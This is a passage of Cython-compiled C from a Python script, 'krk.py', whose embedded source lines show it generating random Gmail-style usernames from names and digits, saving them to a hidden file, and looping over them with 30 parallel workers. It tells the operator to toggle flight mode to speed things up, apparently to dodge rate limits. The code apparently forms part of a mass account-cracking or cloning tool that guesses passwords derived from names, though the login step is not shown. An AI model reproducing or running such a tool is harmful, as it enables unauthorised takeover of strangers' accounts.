      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_last, __pyx_n_s_lower); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 318, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_14 = NULL;
      __pyx_t_4 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_14)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
          __Pyx_INCREF(__pyx_t_14);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_2, function);
          __pyx_t_4 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[1] = {__pyx_t_14, };
        __pyx_t_13 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 318, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      }
      __pyx_t_2 = PyNumber_Add(__pyx_t_10, __pyx_t_13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 318, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = PyNumber_Add(__pyx_t_2, __pyx_v_mail); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 318, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = PyNumber_Add(__pyx_t_13, __pyx_v_domain); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 318, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__25); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 318, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = PyNumber_Add(__pyx_t_13, __pyx_v_first); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 318, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__22); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 318, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = PyNumber_Add(__pyx_t_13, __pyx_v_last); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 318, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__63); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 318, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = NULL;
      __pyx_t_4 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
        __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_12);
        if (likely(__pyx_t_2)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
          __Pyx_INCREF(__pyx_t_2);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_12, function);
          __pyx_t_4 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_t_13};
        __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 318, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      }
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    }
    __pyx_L13:;

    /* "krk.py":319
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         fo = open('.re.txt', 'r').read().splitlines()             # <<<<<<<<<<<<<<
 *                 with tred(max_workers=30) as Sabir:
 *                         total = str(len(fo))
 */
    __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__64, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 319, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_13);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_read); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 319, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
    __pyx_t_13 = NULL;
    __pyx_t_4 = 0;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_13)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_13);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
        __pyx_t_4 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[1] = {__pyx_t_13, };
      __pyx_t_12 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 319, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    }
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 319, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
    __pyx_t_12 = NULL;
    __pyx_t_4 = 0;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_12)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_12);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
        __pyx_t_4 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[1] = {__pyx_t_12, };
      __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 319, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    }
    __Pyx_XDECREF_SET(__pyx_v_fo, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "krk.py":311
 *                 print(' Getting gmails...')
 *                 lists = ['3','4']
 *                 for xd in range(limit):             # <<<<<<<<<<<<<<
 *                         lchoice = random.choice(lists)
 *                         if '3' in lchoice:
 */
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":320
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         fo = open('.re.txt', 'r').read().splitlines()
 *                 with tred(max_workers=30) as Sabir:             # <<<<<<<<<<<<<<
 *                         total = str(len(fo))
 *                         clear()
 */
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_tred); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 320, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 320, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 320, __pyx_L1_error)
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 320, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_7 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 320, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 320, __pyx_L15_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_12 = NULL;
    __pyx_t_4 = 0;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_12)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_12);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
        __pyx_t_4 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[1] = {__pyx_t_12, };
      __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 320, __pyx_L15_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    }
    __pyx_t_1 = __pyx_t_3;
    __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_5, &__pyx_t_15);
        __Pyx_XGOTREF(__pyx_t_6);
        __Pyx_XGOTREF(__pyx_t_5);
        __Pyx_XGOTREF(__pyx_t_15);
        /*try:*/ {
          __pyx_v_Sabir = __pyx_t_1;
          __pyx_t_1 = 0;

          /* "krk.py":321
 *                         fo = open('.re.txt', 'r').read().splitlines()
 *                 with tred(max_workers=30) as Sabir:
 *                         total = str(len(fo))             # <<<<<<<<<<<<<<
 *                         clear()
 *                         print(' Total account : \033[1;32m'+total)
 */
          if (unlikely(!__pyx_v_fo)) { __Pyx_RaiseUnboundLocalError("fo"); __PYX_ERR(0, 321, __pyx_L19_error) }
          __pyx_t_8 = PyObject_Length(__pyx_v_fo); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 321, __pyx_L19_error)
          __pyx_t_1 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 321, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 321, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_v_total = __pyx_t_2;
          __pyx_t_2 = 0;

          /* "krk.py":322
 *                 with tred(max_workers=30) as Sabir:
 *                         total = str(len(fo))
 *                         clear()             # <<<<<<<<<<<<<<
 *                         print(' Total account : \033[1;32m'+total)
 *                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
 */
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_clear); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 322, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_3 = NULL;
          __pyx_t_4 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
            if (likely(__pyx_t_3)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
              __Pyx_INCREF(__pyx_t_3);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_1, function);
              __pyx_t_4 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_3, };
            __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 322, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          }
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          /* "krk.py":323
 *                         total = str(len(fo))
 *                         clear()
 *                         print(' Total account : \033[1;32m'+total)             # <<<<<<<<<<<<<<
 *                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
 *                         linex()
 */
          __pyx_t_2 = PyNumber_Add(__pyx_kp_s_Total_account_1_32m, __pyx_v_total); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 323, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 323, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "krk.py":324
 *                         clear()
 *                         print(' Total account : \033[1;32m'+total)
 *                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")             # <<<<<<<<<<<<<<
 *                         linex()
 *                         for user in fo:
 */
          __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__65, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 324, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "krk.py":325
 *                         print(' Total account : \033[1;32m'+total)
 *                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
 *                         linex()             # <<<<<<<<<<<<<<
 *                         for user in fo:
 *                                 ids,names = user.split('|')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_linex); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 325, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_3 = NULL;
          __pyx_t_4 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
            if (likely(__pyx_t_3)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
              __Pyx_INCREF(__pyx_t_3);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_2, function);
              __pyx_t_4 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_3, };
            __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 325, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "krk.py":326
 *                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
 *                         linex()
 *                         for user in fo:             # <<<<<<<<<<<<<<
 *                                 ids,names = user.split('|')
 *                                 first_name = names.rsplit(' ')[0]
 */
          if (unlikely(!__pyx_v_fo)) { __Pyx_RaiseUnboundLocalError("fo"); __PYX_ERR(0, 326, __pyx_L19_error) }
          if (likely(PyList_CheckExact(__pyx_v_fo)) || PyTuple_CheckExact(__pyx_v_fo)) {
            __pyx_t_1 = __pyx_v_fo; __Pyx_INCREF(__pyx_t_1); __pyx_t_8 = 0;
            __pyx_t_9 = NULL;
          } else {
            __pyx_t_8 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_fo); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 326, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_9 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 326, __pyx_L19_error)
          }
          for (;;) {
            if (likely(!__pyx_t_9)) {
              if (likely(PyList_CheckExact(__pyx_t_1))) {
                if (__pyx_t_8 >= PyList_GET_SIZE(__pyx_t_1)) break;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_8); __Pyx_INCREF(__pyx_t_2); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 326, __pyx_L19_error)
                #else
                __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 326, __pyx_L19_error)
                __Pyx_GOTREF(__pyx_t_2);
                #endif
              } else {
                if (__pyx_t_8 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_8); __Pyx_INCREF(__pyx_t_2); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 326, __pyx_L19_error)
                #else
                __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 326, __pyx_L19_error)
                __Pyx_GOTREF(__pyx_t_2);
                #endif
              }
            } else {
              __pyx_t_2 = __pyx_t_9(__pyx_t_1);
              if (unlikely(!__pyx_t_2)) {
                PyObject* exc_type = PyErr_Occurred();
                if (exc_type) {
                  if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                  else __PYX_ERR(0, 326, __pyx_L19_error)
                }
                break;
              }
              __Pyx_GOTREF(__pyx_t_2);
            }
            __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_2);
            __pyx_t_2 = 0;

            /* "krk.py":327
 *                         linex()
 *                         for user in fo:
 *                                 ids,names = user.split('|')             # <<<<<<<<<<<<<<
 *                                 first_name = names.rsplit(' ')[0]
 *                                 try:
 */
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 327, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_12 = NULL;
            __pyx_t_4 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
              __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_3);
              if (likely(__pyx_t_12)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                __Pyx_INCREF(__pyx_t_12);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_3, function);
                __pyx_t_4 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_12, __pyx_kp_s__25};
              __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
              __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
              if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 327, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            }
            if ((likely(PyTuple_CheckExact(__pyx_t_2))) || (PyList_CheckExact(__pyx_t_2))) {
              PyObject* sequence = __pyx_t_2;
              Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
              if (unlikely(size != 2)) {
                if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                __PYX_ERR(0, 327, __pyx_L19_error)
              }
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              if (likely(PyTuple_CheckExact(sequence))) {
                __pyx_t_3 = PyTuple_GET_ITEM(sequence, 0); 
                __pyx_t_12 = PyTuple_GET_ITEM(sequence, 1); 
              } else {
                __pyx_t_3 = PyList_GET_ITEM(sequence, 0); 
                __pyx_t_12 = PyList_GET_ITEM(sequence, 1); 
              }
              __Pyx_INCREF(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_12);
              #else
              __pyx_t_3 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 327, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_3);
              __pyx_t_12 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 327, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_12);
              #endif
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            } else {
              Py_ssize_t index = -1;
              __pyx_t_13 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 327, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_13);
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
              __pyx_t_16 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_13);
              index = 0; __pyx_t_3 = __pyx_t_16(__pyx_t_13); if (unlikely(!__pyx_t_3)) goto __pyx_L27_unpacking_failed;
              __Pyx_GOTREF(__pyx_t_3);
              index = 1; __pyx_t_12 = __pyx_t_16(__pyx_t_13); if (unlikely(!__pyx_t_12)) goto __pyx_L27_unpacking_failed;
              __Pyx_GOTREF(__pyx_t_12);
              if (__Pyx_IternextUnpackEndCheck(__pyx_t_16(__pyx_t_13), 2) < 0) __PYX_ERR(0, 327, __pyx_L19_error)
              __pyx_t_16 = NULL;
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              goto __pyx_L28_unpacking_done;
              __pyx_L27_unpacking_failed:;
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              __pyx_t_16 = NULL;
              if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
              __PYX_ERR(0, 327, __pyx_L19_error)
              __pyx_L28_unpacking_done:;
            }
            __Pyx_XDECREF_SET(__pyx_v_ids, __pyx_t_3);
            __pyx_t_3 = 0;
            __Pyx_XDECREF_SET(__pyx_v_names, __pyx_t_12);
            __pyx_t_12 = 0;

            /* "krk.py":328
 *                         for user in fo:
 *                                 ids,names = user.split('|')
 *                                 first_name = names.rsplit(' ')[0]             # <<<<<<<<<<<<<<
 *                                 try:
 *                                         last_name = names.rsplit(' ')[1]
 */
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_rsplit); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 328, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_3 = NULL;
            __pyx_t_4 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_3)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_3);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
                __pyx_t_4 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_kp_s__22};
              __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
              __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
              if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 328, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            }
            __pyx_t_12 = __Pyx_GetItemInt(__pyx_t_2, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 328, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_XDECREF_SET(__pyx_v_first_name, __pyx_t_12);
            __pyx_t_12 = 0;

            /* "krk.py":329
 *                                 ids,names = user.split('|')
 *                                 first_name = names.rsplit(' ')[0]
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         last_name = names.rsplit(' ')[1]
 *                                 except IndexError:
 */
            {
              __Pyx_PyThreadState_declare
              __Pyx_PyThreadState_assign
              __Pyx_ExceptionSave(&__pyx_t_17, &__pyx_t_18, &__pyx_t_19);
              __Pyx_XGOTREF(__pyx_t_17);
              __Pyx_XGOTREF(__pyx_t_18);
              __Pyx_XGOTREF(__pyx_t_19);
              /*try:*/ {

                /* "krk.py":330
 *                                 first_name = names.rsplit(' ')[0]
 *                                 try:
 *                                         last_name = names.rsplit(' ')[1]             # <<<<<<<<<<<<<<
 *                                 except IndexError:
 *                                         last_name = 'Khan'
 */
                __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_rsplit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 330, __pyx_L29_error)
                __Pyx_GOTREF(__pyx_t_2);
                __pyx_t_3 = NULL;
                __pyx_t_4 = 0;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
                  __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
                  if (likely(__pyx_t_3)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                    __Pyx_INCREF(__pyx_t_3);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_2, function);
                    __pyx_t_4 = 1;
                  }
                }
                {
                  PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_kp_s__22};
                  __pyx_t_12 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
                  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                  if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 330, __pyx_L29_error)
                  __Pyx_GOTREF(__pyx_t_12);
                  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                }
                __pyx_t_2 = __Pyx_GetItemInt(__pyx_t_12, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 330, __pyx_L29_error)
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                __Pyx_XDECREF_SET(__pyx_v_last_name, __pyx_t_2);
                __pyx_t_2 = 0;

                /* "krk.py":329
 *                                 ids,names = user.split('|')
 *                                 first_name = names.rsplit(' ')[0]
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         last_name = names.rsplit(' ')[1]
 *                                 except IndexError:
 */
              }
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
              __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
              goto __pyx_L36_try_end;
              __pyx_L29_error:;
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

              /* "krk.py":331
 *                                 try:
 *                                         last_name = names.rsplit(' ')[1]
 *                                 except IndexError:             # <<<<<<<<<<<<<<
 *                                         last_name = 'Khan'
 *                                 fs = first_name.lower()
 */
